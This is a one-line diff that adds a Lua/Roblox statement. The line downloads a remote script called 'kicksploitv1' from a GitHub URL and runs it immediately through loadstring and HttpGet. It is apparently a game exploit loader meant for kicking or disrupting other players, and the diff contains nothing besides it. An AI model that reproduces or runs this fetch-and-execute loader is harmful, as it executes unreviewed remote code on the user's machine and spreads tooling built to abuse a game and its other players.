@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/tfoeofficial/e/blob/main/kicksploitv1",true))()
